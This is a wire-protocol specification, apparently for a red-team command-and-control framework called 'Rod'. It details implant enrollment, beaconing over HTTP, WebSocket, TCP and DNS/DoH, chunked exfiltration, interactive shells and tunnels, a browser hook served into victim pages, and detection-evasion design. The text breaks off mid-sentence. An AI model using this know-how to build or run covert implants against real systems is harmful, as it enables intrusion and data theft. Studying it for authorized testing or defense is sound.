# Rod -- Implant contract

The compliance ladder and wire reference for a from-scratch implant. The wire
protocol is the product (architecture.md Sec 4.2, Sec 12.2): any language that
can speak it can be a Rod implant. This file defines what "speak it" minimally
means, every byte-level shape an implant author needs, what is optional
hardening, and the rules that keep the minimum small while the platform grows.
The reference Rust implant (`src/implant/rust/`) implements every tier it
carries; it
is the worked example, not the obligation.

The contract sources are `src/teamserver/Rod.Protocol/protos/rod.proto` (the
authoritative wire messages -- compile it with your own toolchain), this wire
reference, and the baked build profile a build unit emits. Everything here is
verified against the teamserver code; where behavior differs, rod.proto and
the code win and this file is a bug.

## Wire reference

### Endpoints

A deployment exposes its implant-facing endpoints by family (listener
configuration, architecture.md Sec 8 -- the settled four-family surface):

| Purpose | Transport | Route |
|---------|-----------|-------|
| Enroll | Plain HTTP(S), anonymous | `POST /implants/enroll` |
| Beacon / tasking (envelope) | Plain HTTP(S) POST, key-authenticated | `POST /implants/beacon` |
| Beacon / tasking (WebSocket) | Plain HTTP(S) upgrade, key-authenticated | `GET /implants/beacon/stream` |
| Enroll + beacon (socket) | Raw TCP, handshake-identified | `tcp://host:port` |
| Enroll + beacon (datagram) | DNS TXT, id-identified | `dns://resolver/zone` (DoH: RFC 8484) |

The enroll listener accepts plain JSON with no client certificate -- the
implant authenticates with the one-use deploy token, not a cert it does not
have yet. Every contact route is authenticated by the per-artifact key the
build baked -- no TLS client certificate exists anywhere in the surface.
The beacon shapes carry the same frames -- the held connections (the
WebSocket beacon, the socket family's live mode) are the interactive shape
(server-push tasking, live channels), the poll shapes (the envelope cycle,
the socket family's per-cycle connections, the DNS TXT exchange) carry the
interactive verbs store-and-forward.

### TLS shape

- **Server identity:** the `https` fronts present the engagement CA's
  server leaf (a SAN naming the front's public host); the implant pins
  chain-to-CA from the enrollment's CA chain and runs full validation,
  server-name matching included. No route anywhere asks for a TLS client
  certificate -- identity is the per-artifact key at the application layer
  and the handshake id, never a transport certificate (the retired mTLS
  posture; a `CertificateRequest` is itself a fingerprint).

### Enrollment

`POST /implants/enroll`, `Content-Type: application/json`, camelCase JSON:

```json
{
  "deployTokenSecret": "<the one-use secret the operator minted>",
  "publicKey": "<base64 DER SubjectPublicKeyInfo of your ECDSA P-256 public key>",
  "class": "Implant",
  "parentImplantId": null
}
```

`publicKey` is what makes the implant own its identity: submit the public
half, keep the private half, and the returned leaf is signed over your key.
`class` is optional (defaults to the Implant class); `parentImplantId` is set only by a
child derivation (`lateral.move`). A malleable profile may wrap the whole JSON
body as a single base64 JSON string (the profile's base64 envelope) -- the
teamserver accepts both shapes.

Response `200 OK`:

```json
{
  "status": 1,
  "implantId": "<guid>",
  "engagementId": "<guid>",
  "leafCertificate": "<base64 DER leaf, signed over your public key>",
  "caChain": ["<base64 DER CA cert>"],
  "parentImplantId": null
}
```

`status` is the proto `EnrollStatus`: `1` OK, `2` bad token, `3` expired,
`4` spent. A token failure answers `401` with the status set and no
certificate material; a malformed body answers `400`. Bad/expired/spent are
**definitive** -- do not retry them. Transport failures (connection refused,
timeout) are worth retrying with exponential backoff.

### The Contact stream

Every carriage carries the same protobuf messages defined in rod.proto. The
unit that crosses them is `Frame`: an opaque `payload` plus, upstream only,
a `kind` discriminator. Keep a single payload near or under 1 MiB and chunk
anything larger.

**Frame order:**

1. The implant speaks first: one `Frame` whose payload is a `HandshakeRequest`
   (protocol version `1.0`, the implant id, the advertised verb list, and
   optionally the replay-nonce and receive-ack advertisements -- see the
   signature section and the dispatch strand below).
2. The server answers with one `Frame` whose payload is a `HandshakeResponse`.
   `status` must be `1` (`OK`); anything else is **permanent for this
   artifact** -- terminate rather than retry:
   `2` version mismatch, `3` unknown implant, `4` identity mismatch,
   `5` kill date expired, `6` implant retired.
3. Thereafter the stream carries tasking downstream (`TaskRequest` payloads,
   no kind set -- discriminate positionally after the handshake) and results
   upstream (`TaskResult` with `kind = FRAME_KIND_TASK_RESULT`, `TaskAck`
   with `kind = FRAME_KIND_TASK_ACK` (the receive-ack arm below),
   `ExfilChunk` with `kind = FRAME_KIND_EXFIL_CHUNK`, `StagedPull` with
   `kind = FRAME_KIND_STAGED_PULL`, `ChannelOutput` with
   `kind = FRAME_KIND_CHANNEL_OUTPUT`). An upstream frame with `kind`
   unset is tolerated as a `TaskResult` (legacy shape). One downstream frame
   does set its kind: `ChannelInput` (`kind = FRAME_KIND_CHANNEL_INPUT`), the
   operator input half of an interactive channel -- discriminate downstream
   frames on kind first and fall back to the positional `TaskRequest` parse
   for kindless frames. The server routes a `ChannelInput` only to an implant
   whose handshake advertised the channel verb, so an implant that never
   opted in never receives a kind-bearing downstream frame.

**The dispatch strand (receive acks).** Set `task_acks` in the handshake and
the server echoes it: from then on, ack every parsed `TaskRequest` with a
`TaskAck` frame (its `task_id`) *before* executing it. The ack is delivery
evidence, not execution evidence -- it says the frame crossed intact. A
stream that dies before the ack makes the server redeliver the task on the
next contact, so delivery is at-least-once and the implant owes two things:
recognize a task id it already parsed (re-ack it, never run it twice), and
re-send a cached result when the original delivery died with a stream -- the
server records first-wins, so a duplicate result is a no-op there. The
negotiation is per handshake by design: stop advertising and the arm is off
for that connection, keeping an unupgraded pair on today's semantics (a
written frame counts as delivered). Over the poll carriers (the envelope,
the pipe/TCP contacts) the ack rides the next request body and the server
accepts it inertly -- those carriers answer whole or not at all and never
requeue on acks; the dedup still pays, because a task requeued by a dead
stream can be redelivered over any carrier the run lands on. DNS carries no
ack at all (no handshake rides it).

**Using the stream:** hold it open for the session (stream mode -- the
interactive shape, server pushes tasking the moment it is queued) or run
contact cycles (poll mode -- drain queued tasking, half-close, wait for the
server to end the stream, sleep the baked interval with jitter, reconnect and
re-handshake). Both are Tier 0; the server treats them identically and reuses
the implant's session across reconnects.

### The envelope contact (the web contact)

`POST /implants/beacon` against any web listener (`http` and `https`
fronts alike). The body is a sequence of rod.v1 `Frame` messages, each prefixed with
its byte length as an unsigned protobuf varint -- the canonical
delimited-stream shape every protobuf runtime ships -- sealed under the
per-artifact key the build baked (below). One POST is one poll contact:

- **Request body:** the sealed envelope (or, on a lab build with contact
  protection off, the raw framed sequence) whose plaintext is a strictly
  increasing 8-byte big-endian counter ahead of the handshake `Frame` first,
  then any `TaskResult`, `TaskAck`, `ExfilChunk`, `StagedPull`, and
  `ChannelOutput`
  frames. The server's caps are 2 MiB per frame, 1024 frames, and 16 MiB per
  wire body (the frames inside a sealed body ride a ~3/4 share of that --
  base64 overhead): an oversized frame, count, or body answers `413`,
  malformed framing answers `400`, and a body that does not verify under its
  artifact key, a counter at or below the accepted floor, or a plaintext body
  from an implant bound to a key answers `401`.
- **Response body:** the same seal, under the response's own purpose tag --
  the `HandshakeResponse` frame first, then the `ExfilProgress` seam reports
  for any offset-bearing `ExfilChunk` frames the request placed, then the
  `StagedChunk` run answering each request-body `StagedPull` (in demand
  order), then dispatched `TaskRequest` frames in queue order while the
  4 MiB dispatch budget lasts -- what does not fit is requeued and rides the
  next contact. A non-OK handshake response is the only frame in the body:
  the contact is refused, and every non-OK status is permanent exactly as on
  the stream.
- **Poll discipline:** contact, drain, close, sleep the baked interval with
  jitter, repeat. Every POST re-handshakes; the server reuses the session
  across contacts, so the cadence neither churns session entities nor
  floods the engagement trail with `SessionOpened` records. Burn the counter
  on every attempt, not every delivery: a retransmitted batch after a lost
  response must carry a fresh counter, and the batch semantics make the
  retransmission itself idempotent (a re-sent result for a completed task is
  a no-op server-side).
- **The envelope's bounds:** a resumable exfil run (below) spans contacts --
  each body carries the slices its budget admits and the response's seam
  reports chain the contacts -- while a channel task (`shell.interact`)
  claims over the envelope under the degraded discipline below -- only DNS
  never claims one, because a datagram poll has no stream to carry the
  input half.

**The degraded channel discipline (always carried).** Every poll-mode
build advertises the `channels.poll` capability in its handshake, and the
interactive verbs claim over its envelope cycles -- operator input parks
server-side and rides the next contact's response as `ChannelInput`
frames, the implant's `ChannelOutput` and the channel's final
`TaskResult` batch upstream like any other frames, and a channel the
implant stops collecting closes with a timeout `TaskResult` instead of
sitting dispatched. The tradeoff is the operator's to make, not the
bake's: while a channel is open, the interactive traffic rides at the
contact cadence -- every keystroke costs up to one interval down and one
interval back.

The frame contents, the handshake order, the signature discipline, and
the result/chunk grammar are identical to the stream's -- only the carriage
changes. An implant that implements the envelope needs an HTTP client, a
protobuf codec, and AES-256-GCM, nothing else.

#### The sealed body

The default build shape (contact protection on) seals both directions under
the per-artifact key the build minted and baked -- the same key, wire shape,
and byte layout as the opt-in AES-GCM enroll envelope, but under its own
purpose tags so neither direction's ciphertext can be replayed as the
other's:

```
body   := base64( b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16) )
AAD    := "rod-contact-v1"        (requests)
        | "rod-contact-response-v1"  (responses)
plain  := counter(8, big-endian) || delimited-frames    (requests)
        | delimited-frames                                (responses)
```

The key is standard base64 of `keyId(16) || key(32)` in the baked profile's
`envelopeKey`; the `contactEnvelope` profile key says `"aesgcm"` (seal) or
`"none"` (the lab-debug plaintext frame). Possession of the key is the
authentication -- the web transports request no TLS client certificate at
all -- and the seal is the confidentiality: over cleartext `http`, everything
past the TLS-less wire is still ciphertext to a listener.

### The WebSocket beacon (the web posture's stream)

`GET /implants/beacon/stream` against any web listener -- the same route
family as enroll and the envelope, upgraded to a WebSocket. This is the web
posture's interactive shape: a live held session (server-push tasking the
moment it is queued, `ChannelInput` frames flowing down while a channel
runs) over a socket any HTTP client runtime can open, with the envelope's
own authentication -- no protocol stack beyond the WebSocket, no TLS
client certificate anywhere.

The message grammar is the envelope's body grammar, message-shaped:

- **First client message:** exactly the envelope contact's request body --
  the sealed envelope (or the lab build's raw framed sequence) whose
  plaintext is a fresh counter ahead of the handshake `Frame` first, then
  any `TaskResult`, `ExfilChunk`, `StagedPull`, and `ChannelOutput` frames.
  The same key-posture gates apply: a key-bound implant must seal under
  exactly its bound key, and the counter must clear the accepted floor.
- **First server message:** the envelope contact's response shape -- the
  `HandshakeResponse` frame first (sealed when the client sealed; a non-OK
  status is the only frame and the connection ends, permanent as on every
  transport).
- **Every later message, both directions:** the same sealed-or-plaintext
  body, minus the handshake. The server sends one frame per message -- a
  pushed `TaskRequest`, a `StagedChunk` run, a `ChannelInput` unit -- and
  reads whatever delimited sequence a client batches. Each client message
  burns its own counter, exactly like a POST.

The connection is the session's carrier, not the session: a disconnect ends
the channel halves with it (channels are session-scoped) but the session
itself stays live -- reconnect, re-handshake, and the queue continues. The
frame contents, the handshake order, the signature and replay-nonce
discipline, and the staged/channel grammar are identical on every carriage
-- only the carriage changes. An implant that implements
the envelope needs a WebSocket client, a protobuf codec, and AES-256-GCM --
the same bar the envelope sets, plus the socket.

### The browser hook (the in-tree script client)

The Browser-class hook (architecture.md Sec 5.2) is the one client Rod ships
outside the Rust crate: a served `<script src>` artifact that speaks this
contract from the victim page's origin. It is a Tier 0 client with the Tier 1
seal, and the wire bar it holds is the envelope contact's own grammar --
nothing in the protocol exists only for it.

- Enrollment is the JSON enroll above with `"class": "browser"`; the keypair
  obligation (Tier 0's optional-on-the-wire public key) is met only in the
  sealed posture, where `crypto.subtle` is available.
- Contacts are `POST /implants/beacon` with the sealed body: the frame codec
  (handshake, task, result, exfil chunk) is hand-encoded inside the script
  in dependency-free vanilla JavaScript, and the script fetches nothing but
  the two routes it owns.
- Identity is per browser tab: sessionStorage carries the implant id and the
  seal counter across reloads; a context that blocks storage re-enrolls on
  every reload, spending one token use each time (the mint's token budget is
  the enrollment budget, sized by the operator).
- Two postures, chosen at mint. `aesgcm` (mainstream): the key is baked into
  the served script, enroll and contacts seal under it, and the response's
  GCM tag is the hook's server authentication. `none` (the plaintext framed
  body): for hooking plain-`http` pages where `crypto.subtle` is unavailable
  -- no seal and no server authentication, the lab-debug shape the beacon
  route serves only to implants no key was ever bound to.
- Tasking-signature verification (Tier 1) is a named limit of the in-tree
  hook: verifying would mean walking an X.509 chain in vanilla JavaScript.
  The documented follow-up is baking the tasking CA's raw SPKI into the
  script at render, which retires the X.509 walk. A fork wanting the
  hardening today edits the in-tree template the way the crate fork edits
  the Rust source.
- The hook must stay a simple-request client (plain bodies, no custom
  headers): the cross-origin contacts trigger no preflight, and the routes
  answer `Access-Control-Allow-Origin: *` only when the request carries an
  `Origin` header (architecture.md Sec 8).

### Task results and bulk data

A `TaskResult` echoes the task id with an outcome (`1` succeeded, `2` failed)
and an output string. Bulk data (file contents, large captures) does **not**
ride the output string: emit `ExfilChunk` frames after the `TaskResult`, each
carrying the task id, an artifact name, a MIME content type, a 0-origin
sequence, and a terminal flag on the last one. Keep chunks at or under
512 KiB.

**Byte-offset resume (ADR-010, the upload arm).** Offset-less chunks (the
shape above) still complete within one contact under the strict sequence
discipline; a resumable run instead carries, on every chunk, its absolute
`offset` within the artifact and the run's declared `payload_sha256` (32
bytes, the SHA-256 of the whole artifact). The server places slices
idempotently at their offsets -- a duplicate is a no-op, a first chunk at
offset 0 over a partial hold restarts the run, and the run materializes only
when its terminal chunk places and the reassembled bytes hash to the
declaration. A contact whose request carried offset-bearing chunks is
answered with one `ExfilProgress` frame (kind
`FRAME_KIND_EXFIL_PROGRESS`) per touched stream naming the contiguous bytes
the server holds: serve only the remainder past that seam, and a report
behind what you sent (an evicted or restarted server) rewinds you to
re-serve from it. Slice your run to a per-contact budget (the reference
implant sends 8 MiB of slices per contact, 512 KiB per frame) so a run
larger than one body spans contacts -- the seam reports chain them. The
structural gate keeps the arm additive: an implant that never sets `offset`
never receives the kind-bearing progress frame.

### Staged uploads (downstream bulk)

A `TaskRequest` whose `staged_bytes` field is set carries its bulk payload
server-side, not in the arguments string: the arguments end with a
`sha256:<hex>` token -- part of the signed tuple, so the payload is exactly as
tamper-evident as an inline one -- and the bytes must be demanded before the
task reports a result. Send one `Frame` with `kind = FRAME_KIND_STAGED_PULL`
and a `StagedPull{task_id}` payload; the server answers on the same stream with
a run of `StagedChunk` frames (`task_id` echo, 0-origin sequence, terminal on
the last, 512 KiB data slices). Reassemble, verify the sha256 against the
arguments token, then run the verb against the reassembled bytes and report the
`TaskResult` as usual. Nothing bulk ever flows downstream unasked.

**Byte-offset resume (ADR-010).** A run that dies mid-transfer does not restart
from zero: demand again with `offset` set to the byte count you hold and
`prefix_sha256` set to the SHA-256 of exactly those bytes. The server answers
from that seam when the proof matches; when it cannot honor the proof it
answers the whole run from 0, and every `StagedChunk` carries its `offset` --
the absolute byte position of its data -- so a first chunk at offset 0 means
"reset your held bytes and take this run whole". Place chunks by their offset
(a duplicate is a no-op; a gap is unplaceable -- re-demand), and treat
offset-less chunks (a pre-resume server) with the sequence-0-over-held-bytes
fallback. On dispatch, report the payload's hash as
`TaskResult.payload_sha256` (hex): the server compares it against the artifact
it served, and a staged task records Succeeded only when both sides held the
same bytes. Over DNS the same capability rides the `s.`/`d.` grammar below,
and the payload hash travels on the result text's tail
(`"\nsha256:<hex>"`, stripped server-side).

### Interactive channels (the streaming task shape)

`shell.interact` is `shell.exec`'s live shape, and `tunnel.forward` /
`tunnel.socks` are the tunnel pair (architecture.md Sec 5.2, Sec 14):
each `TaskRequest`
opens a channel instead of a one-shot round trip, and the task does not
complete until the channel ends. Flow:

1. Receive the `TaskRequest` like any other and verify its signature. Its
   `arguments` are an optional initial command (the shell) or `<host> <port>`
   (the tunnel: connect from the implant's own vantage).
2. Stream whatever the task produces as `ChannelOutput` frames
   (`kind = FRAME_KIND_CHANNEL_OUTPUT`, payload `ChannelOutput{task_id,
   data}`), in order, as it is produced. The teamserver decodes and
   accumulates the chunks onto the task's transcript live -- an operator
   reads the channel while it runs.
3. Receive the operator's bytes as `ChannelInput` frames downstream
   (`kind = FRAME_KIND_CHANNEL_INPUT`, payload `ChannelInput{task_id, data,
   eof}`), which may interleave with anything else on the stream; route them
   by `task_id`. `eof` means the operator closed the channel's stdin -- for
   the shell that ends the session; for the tunnel it half-closes the TCP
   send side, and answers already in flight still land.
4. End the channel with an ordinary `TaskResult` for the task -- the shell
   exited, the tunneled peer closed its side, or the channel failed. The
   server appends the final output to the transcript and completes the task
   with it as the record.

The channel is session-scoped: it lives on the Contact stream that carried
its `TaskRequest`, and a stream drop ends it (kill the shell or close the
tunnel; the task stays dispatched server-side). Input is not signed -- like a
`StagedChunk` run it rides the authenticated carriage the signed
`TaskRequest` opened.
Keep output chunks at or under 16 KiB. The server routes `ChannelInput` only
for a task whose verb is one of these channel verbs (`shell.interact`,
`tunnel.forward`, `tunnel.socks`); a channel task claims over every poll
carrier under the
store-and-forward discipline (below) -- the envelope cycle, the stream
family's polls, and the DNS grammar alike (input on the TXT answers,
output as `c.` queries).

For a tunnel the channel is byte-transparent: the relayed protocol is none
of the wire contract's business, and the task's final output is the relay
summary (`tunnel to host:port closed: relayed N bytes up, M bytes down`).
The transcript accumulates as UTF-8 text, so binary tunnel traffic renders
with replacement characters -- the traffic's attribution is the task record
and the summary, not byte fidelity in the transcript.

### Stream contacts (raw TCP, the no-egress transport)

The TCP listener carries the envelope's frames over a raw duplex stream --
a plain TCP socket for segment networks that allow sockets but no HTTP
shape (and for Windows segments with no egress at all, the pivot model
reaches deeper than any pipe: a parent implant fronts its children's
tasking over the carriage it already holds). One connection is one poll
contact:

1. Connect to the entry's public endpoint (`host:port`).
2. Write one request message: a varint byte length, then exactly that many
   bytes of the envelope's delimited frame sequence (the handshake frame
   first, then any results, exfil chunks, staged pulls, channel output).
3. Read one response message: the same shape -- a varint byte length, then
   the handshake response, staged chunk runs answering the request's
   demands, and queued tasking while the 4 MiB dispatch budget lasts.
4. Close; sleep the baked interval; reconnect for the next contact.

**Enrollment over the stream contact.** The opening request message may
carry a kind-bearing `EnrollRequest` frame ahead of its handshake -- the
same enroll body the web route carries, promoted into the frame grammar
(token secret, class, the implant's public key as DER
SubjectPublicKeyInfo, parent, host facts, kill date). The server answers
it as its own response message, a single `EnrollResponse` frame (`Ok`
with the implant id, engagement id, leaf certificate, CA chain, and --
when the redeemed token names a build -- the per-artifact contact key;
a refusal carries just the status, no signal beyond no). After an
acceptance the ordinary handshake follows on the same connection, so a
no-egress segment can enroll its first implant over the socket it already
reaches; a client may also close after the enroll exchange and contact on
fresh connections. A baked per-artifact key seals the whole carriage --
the enroll exchange and every contact message are AES-256-GCM under it
(the contact body wrapping a fresh big-endian counter the server floors;
each direction under its own purpose tag), the same seal the cleartext
http posture carries, so a bare wire leaks no frame bytes. The reference
Rust implant's raw-TCP carriage carries all of it: the dial shape is
`tcp://host:port`, and the contact cycle is the envelope's own
request/response shape over the message framing, with the interactive
verbs on the shared store-and-forward carriage.

**The stream mode (the held live session).** A stream-mode bake over these
fronts holds the connection instead of cycling it: the handshake advertises
the `channels.live` capability, the server answers the handshake response as
its own message, and the connection then runs the live session the web
WebSocket beacon runs -- queued tasking pushed as its
own message the moment it is issued (no request preceding it), result and
channel-output messages sent as they happen, live channels for the
streaming verbs, staged pulls answered by pushed chunk runs. A dropped
connection is a reconnect, not a termination: the session survives
server-side, the next cycle re-handshakes on a fresh connection. The seal
is the poll shape's own (a fresh counter per message, each direction under
its own purpose tag). An older teamserver that does not know the
advertisement serves the connection as an ordinary poll contact, so the
capability is a graceful step up, never a break.

No client certificate rides these transports: the implant is identified by
the id in its handshake (the DNS posture, extended to a handshake-capable
transport), and a refused handshake answers a bare `Unspecified`. Dispatched
tasking keeps the full signature posture -- verify it exactly like a
stream-delivered task. Channel tasks claim under the store-and-forward
discipline every poll artifact advertises (`channels.poll` in the
handshake): operator input parks server-side and rides the next
connection's response as `ChannelInput` frames, channel output batches
upstream like any other frame. Oversized or malformed messages drop the
connection without an answer.

### The retired families (QUIC, SMB, mTLS gRPC)

The QUIC duplex socket transport, the SMB named-pipe transport, and the
mTLS-terminated gRPC stream are retired from the in-tree surface
(architecture.md Sec 8's four-family decision). The frozen wire contract
keeps what they owned: the enroll-exchange frame kinds stay reserved in
rod.v1's `FrameKind`, the message grammars above carry unchanged, and a
community unit reviving a family registers a transport provider against
the same contracts -- the listener registry, the carrier table, and the
bake parser all take new registrations without core edits
([transports.md](transports.md)).
### DNS contacts (Tier 2, the egress-restricted transport)

A DNS listener entry answers TXT queries over UDP under its zone (the entry's
public endpoint). The contact grammar encodes into the query NAME as lowercase
RFC 4648 base32 labels, no padding:

```
poll:          p.<b32(implant id)>.<zone>
key-named poll:k.<b32(implant id)>.<b32(key id)>.<zone>
result chunk:  r.<b32(task id)>.<s|f>.<seq>.<t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
channel chunk: c.<b32(task id)>.<seq>.<t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
enroll chunk:  e.<b32(stream id)>.<seq>.<t|m>.<b32(chunk)>.<zone>
enroll answer: a.<b32(token)>.<seq>.<zone>
delivery probe:n.<b32(task id)>.<b32(sha128)>.<b32(implant id)>.<zone>
staged demand: s.<b32(task id)>.<offset>.<b32(sha256) | e>.<b32(implant id)>.<zone>
staged get:    d.<b32(token)>.<seq>.<zone>
exfil seam:    x.<b32(task id)>.<b32(sha128 of name)>.<b32(implant id)>.<zone>
exfil upload:  u.<b32(stream id)>.<seq>.<t|m>.<b32(sealed chunk)>.<b32(implant id)>.<zone>
```

**Sealing (a build that baked an envelope key).** The contact carriage
seals like the enroll exchange does, so the resolver chain reads no frame
bytes in the clear: the implant polls `k.`-named -- the key id rides the
name as its raw 16 guid bytes -- and the answer's TXT payload is the
base32 of a raw `R1` AES-GCM body (`R1 || keyId || nonce || ciphertext ||
tag`, the envelope family's own shape without the base64 layer) under the
`rod-dns-poll-v1` purpose tag; open it, then read the kind byte as
ordinary. Results and channel outputs seal whole before chunking (one
body per report, not per chunk) under `rod-dns-result-v1` and
`rod-dns-channel-v1` respectively -- the `s|f` outcome flag and the task
id stay in the name, where they ride either way. The server resolves the
key by the id on the wire, so sealing survives a teamserver restart with
nothing re-established. A plaintext answer to a sealed poll (the key's
payload record was deleted) still carries its kind byte: run it -- the
signature, not the seal, gates execution. Symmetrically, the server
refuses the downgrade for a key-bound implant: a plain `p.` poll is
answered empty, and a plaintext result or channel reassembly is dropped.

A poll is answered with zero or one TXT record whose strings concatenate to
the base32 of a kind byte plus its message: `t` names a signed
`TaskRequest` (verify it exactly like a stream-delivered one -- the
signature covers the canonical tuple); `i` names the parked channel input
the store-and-forward discipline drained -- every collected
`ChannelInput` frame, each length-prefixed (a varint byte length ahead of
its message), so a typing burst and its eof cross together. An empty
answer means no tasking and no parked input. A result is reported as
chunked queries (0-origin `seq`, `t` terminal
or `m` more, UTF-8 chunks; an empty chunk rides as the bare label `e`),
answered with an empty NOERROR. A live channel's output chunks up the
same way as `c.` queries: the chunks reassemble into the channel's data
bytes (the task id rides the name), landing on the task's transcript
through the shared composition every carrier uses. Send EDNS0 (the answers ride up to 1232
bytes); short-argument tasking only -- a task that does not fit is not
delivered over DNS.

**Delivery confirmation (the retransmission half).** A datagram carrier
loses chunks, and a gap in a report's 0..n sequence drops the server's
reassembly whole -- so a report is not delivered when its queries were
sent, but when the server confirms the exact blob landed. After chunking
a result or channel output, probe
`n.<b32(task id)>.<b32(first 16 bytes of SHA-256 over the plaintext)>.<b32(implant id)>.<zone>`:
the TXT answer is `y` once that blob's reassembly reached recording
(base32 like every TXT payload here), `n` while it has not. Keep the
frame pending until `y` and re-send the whole chunk sequence on later
cycles -- first-wins recording makes the re-send idempotent, and the
restarted-server case is one redundant re-send. The reference implant's
flush loop does exactly this.

**Staged transfers (the resumable download, ADR-010).** A staged task the
poll claims is served over this grammar: demand
`s.<b32(task id)>.<offset>.<b32(sha256 of held) | e>.<b32(implant id)>.<zone>`
(the offset decimal, the bare `e` label on a fresh demand), answered
`=<b32 token>`; then drain `d.<b32(token)>.<seq>.<zone>` sequentially --
each answer `<t|m>.<b32 chunk>` is a 200-byte slice from the honored
seam, and the same prefix-proof rule the frame carriages run decides that
seam. A lost download (an evicted token, a dead front) re-demands on the
next cycle from wherever placement stopped: resume on the query-rate
cadence. For a keyed artifact each chunk seals as a raw R1 body under the
`rod-dns-staged-v1` purpose tag -- open per chunk, place at its offset,
never wait on a whole sealed blob. The completing report rides the
`r.`-chunks with the payload hash on the text's tail
(`"\nsha256:<hex>"`), verified and stripped server-side.

**Exfil uploads (the resumable upload, ADR-010 -- sealed-only).** A keyed
artifact's exfil run rides the same resume discipline at the query-rate
cadence, one datagram-sized blob per contact. Probe the seam first:
`x.<b32(task id)>.<b32(first 16 bytes of SHA-256 over the artifact name)>.
<b32(implant id)>.<zone>` answers the decimal byte count the server holds
(the name itself cannot ride a DNS label; its hash maps back through the
placements the server saw -- a probe ahead of the first blob answers `0`,
which is the held truth anyway). Then serve one blob from that seam as a
`u.` upload stream -- `u.<b32(stream id, client-chosen per blob)>.<seq>.
<t|m>.<b32(sealed chunk)>.<b32(implant id)>.<zone>`, e.-shaped in-order
chunks answered `+` -- whose terminal chunk assembles one raw R1 body
under the `rod-dns-exfil-v1` purpose tag wrapping a single offset-bearing
`ExfilChunk` frame (the same frame grammar the stream carriages carry,
including the declared `payload_sha256`). The server places the slice
through the shared per-task reassembly under a 1 MiB per-stream ceiling;
a lost blob never moved the seam, so the next probe re-serves it. The arm
is sealed-only by design: the task id rides the query name in the clear,
so a plaintext upload would let anyone who can query the listener forge
artifacts onto real tasks -- a blob that does not resolve a baked key and
verify under the tag drops whole, and a run past the cap (or a bake with
no key) needs a stream carriage.

**Record types beyond TXT (the cover).** An A query anywhere under the
zone answers one A record -- the bind's own host when the bind is a
concrete address, else a deterministic per-name address in
198.18.0.0/15 (TTL 60). A zone that answered TXT for random labels but
NXDOMAIN for every A query would itself be the fingerprint; an ordinary
v4 zone answers its A records, so this one does too. AAAA and every
other type keep the NXDOMAIN a v4-only zone would give; a query outside
the zone is REFUSED (this listener is not an open resolver).

**Enrollment over DNS (the full-independence step for a DNS-only target).**
The enroll body -- the framed `EnrollRequest`, sealed under the baked
per-artifact key when the artifact carries one (the raw base64 of the sealed
envelope, so the token secret never crosses the resolver chain in the clear)
-- uploads as chunked `e.` queries keyed by a client-chosen random stream id,
each answered `+` until the terminal chunk's answer names a download token
(`=<b32(token)>`). The `EnrollResponse` -- framed, sealed under the same key
when the upload was -- downloads as token-keyed `a.` answers (`<t|m>.<b32(chunk)>`,
0-origin, terminal-flagged). The terminal upload chunk drives the shared
scoped-enrollment flow against the answering listener's engagement; an
accepted DNS enrollment opens the session itself (no handshake exists to
open it), and the polls that follow refresh what it wrote. A manually minted
token names no build, so its exchange rides plaintext and the key arrives in
the answer. The whole lifecycle rides the one carrier -- the lightweight
implant a DNS-only target runs.

The transport's identity tradeoff is deliberate: no handshake rides
the DNS contact path -- an implant is identified by its id alone on polls
and results (the sealed enroll exchange authenticates by key possession).
Downstream tasking keeps the full
Tier 1 posture: verify the signature before executing anything received over
DNS. The reference implant's DNS client dials a beacon URL of the shapes
`dns://<resolver-host>[:<port>]/<zone>` (the resolver is the listener
itself; a build naming a DNS listener bakes the listener's bind, and a
wildcard bind is refused with that fix) and
`doh://<resolver-host>[:<port>]/<zone>` (the DoH carriage, RFC 8484: the
same wire message riding an HTTPS POST body to /dns-query, TLS anchored to
the enrolled CA chain -- DNS-shaped traffic that blends as HTTPS). The
authority is always a resolver the implant dials directly and the zone
always rides the path: the family has no system-resolver mode, so a
path-less `dns://` URL (empty zone) is not a supported bake.

**The DoH carriage (RFC 8484).** A `doh` listener entry answers the same
grammar over HTTPS: the DNS wire message rides an HTTP body -- `GET
/dns-query?dns=<urlsafe-base64>` or `POST /dns-query` with
`application/dns-message` -- and the response is the same wire message the
UDP socket would return. The entry's public endpoint is its zone, the UDP
listener's model; the arrival port resolves which `doh` listener answers,
and a socket no `doh` listener owns returns an ordinary 404. The TLS
posture is the single-port https shape (no client certificate request --
a resolver front must not fingerprint), and the identity tradeoff is
DNS's own: id alone, session opened elsewhere, signatures verified. The
carriage changes; the answer never does.

### Tasking signature verification (Tier 1, recommended)

Every dispatched `TaskRequest` carries an RSASSA-PSS/SHA-256 signature made by
the tasking CA -- the same CA whose chain the implant holds from enrollment.
Verify before executing; report a failure as a `Failed` task rather than
running anything. The signed bytes are a fixed canonical encoding (NOT the
serialized message), so every language verifies identically:

```
canonical = ""
for value in [my_own_implant_id, task.task_id, task.verb, task.arguments]:
    bytes   = utf8(value)
    canonical += uint32_little_endian(len(bytes)) + bytes
verify RSASSA-PSS(SHA-256) over canonical with each RSA-bearing CA public key
```

The implant id in the tuple is the **verifier's own** id, not a wire field:
tasking signed for another implant fails verification on yours, so captured
tasking cannot be replayed cross-implant.

**Fronted tasking (Tier 2, the fronting arm).** The one exception to "the
verifier's own id": a frame whose `target_implant_id` is set names a Pivot
child the server directed to your stream (architecture.md Sec 5.2, Sec 10.3)
-- a host that cannot run an implant of its own, fronted by yours. Verify the
tuple against `target_implant_id`, not your own id; the signature was made
for the child, and that is exactly what binds the task to its executor. An
implant that derives children should front only what it enrolled (keep the
child ids from your enroll responses and refuse frames naming anything else),
and nonce rules follow the target: a fronted frame is nonce-less, because the
child never handshakes. An implant that does not implement fronting ignores
the unknown field and fails the verb on its own terms; a server never fronts
tasking to one that does not, so the field is absent on every frame a
non-fronting implant receives.

**Replay nonces (Tier 1, the negotiated arm).** The tuple above still
verifies a captured frame replayed to the *same* implant. Close that by
negotiating the replay-nonce arm: set `replay_nonces` on your
`HandshakeRequest`; a server that supports it echoes `replay_nonces` on the
`HandshakeResponse`, and from then on every dispatched task carries
`task_nonce` -- a per-implant monotonic counter -- and the signed tuple grows
a fifth element:

```
tuple = [my_own_implant_id, task.task_id, task.verb, task.arguments]
if task has task_nonce:  # always, once negotiated
    tuple += [decimal_string(task.task_nonce)]
```

Track the highest nonce you accepted (for your whole run, not per connection)
and refuse any task whose nonce is at or below it -- the signature is still
genuine, but the frame is a replay. Once negotiated, refuse nonce-less
